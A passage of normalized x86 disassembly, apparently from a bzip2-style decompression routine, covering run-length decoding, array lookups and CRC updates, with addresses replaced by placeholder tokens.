sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x2c ]
sub edx 0x1
mov [ ebp - 0x2c ] edx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
movzx eax [ ebp - 0x1 ]
xor eax edx
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] edx
mov [ ebp - 0xc ] 0x2
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
and ecx 0xff
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x30 ]
shr edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
movzx edx [ ebp - 0x1 ]
cmp edx [ ebp - 0x20 ]
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + ecx * 4 ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
and edx 0xff
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
and ecx 0xff
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x30 ]
shr edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
movzx eax [ ebp - 0x1 ]
xor eax edx
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx [ ebp - 0x20 ]
je r-xdata
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
and ecx 0xff
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x30 ]
shr edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
movzx ecx [ ebp - 0x1 ]
add ecx 0x4
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x30 ]
and edx 0xff
movzx eax dl
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x30 ]
shr ecx 0x8
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
movzx eax [ ebp - 0x1 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + ecx * 4 ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
and edx 0xff
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
movzx eax [ ebp - 0x1 ]
xor eax edx
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ecx + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
and ecx 0xff
mov [ ebp - 0x1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x38 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x14 ] 0x1
sete cl
movzx edx [ ebp - 0x1 ]
xor edx ecx
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ecx + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
and ecx 0xff
movzx edx cl
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx * 4 + rw-data ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x18 ] 0x200
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
mov ecx [ ebp + 0x8 ]
xor eax [ ecx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
sub_40b600
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
test eax eax
je r-xdata
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jle r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jle r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x3c ]
mov [ eax + 0x8 ] dl
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc60 ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc60 ]
shr eax 0x18
mov edx [ ebp + 0x8 ]
movzx edx [ edx + 0x8 ]
xor eax edx
xor ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc60 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x3c ]
mov [ eax + 0x8 ] dl
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc60 ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc60 ]
shr eax 0x18
mov edx [ ebp + 0x8 ]
movzx edx [ edx + 0x8 ]
xor eax edx
xor ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc60 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
movzx ecx [ ebp - 0x1 ]
xor ecx eax
mov [ ebp - 0x1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x440 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x440 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x2
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x3c ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x2
mov ecx [ ebp + 0x8 ]
add ecx 0x444
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
push eax
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
movzx edx [ ecx + edx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x3
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x440 ] edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
movzx ecx [ ebp - 0x1 ]
xor ecx eax
mov [ ebp - 0x1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x440 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x440 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x3c ]
je r-xdata
jmp r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x3c ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
add edx 0x444
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
movzx eax [ edx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx edx [ ecx + edx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr edx cl
and edx 0xf
shl edx 0x10
or eax edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp + 0x8 ]
add edx 0x444
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_40aa70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
jmp r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x3
mov ecx [ ebp + 0x8 ]
add ecx 0x444
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
push eax
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
movzx edx [ ecx + edx * 2 ]
